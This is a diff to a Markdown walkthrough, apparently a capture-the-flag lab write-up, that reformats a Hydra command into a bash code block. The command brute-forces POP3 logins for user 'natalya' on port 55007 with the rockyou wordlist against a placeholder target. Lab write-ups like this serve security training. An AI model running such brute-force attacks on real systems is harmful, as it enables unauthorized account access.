@@ -31,7 +31,9 @@ Discovered Open Ports:
 ### 3. POP3 Brute-Forcing (boris / natalya)
 
 Use Hydra or Medusa to crack credentials for POP3 users:
-```hydra -l natalya -P /usr/share/wordlists/rockyou.txt <TARGET-IP> -s 55007 pop3```
+```bash
+hydra -l natalya -P /usr/share/wordlists/rockyou.txt <TARGET-IP> -s 55007 pop3
+```
 
 ## Moodle Access & Secondary POP3 Enumeration
 
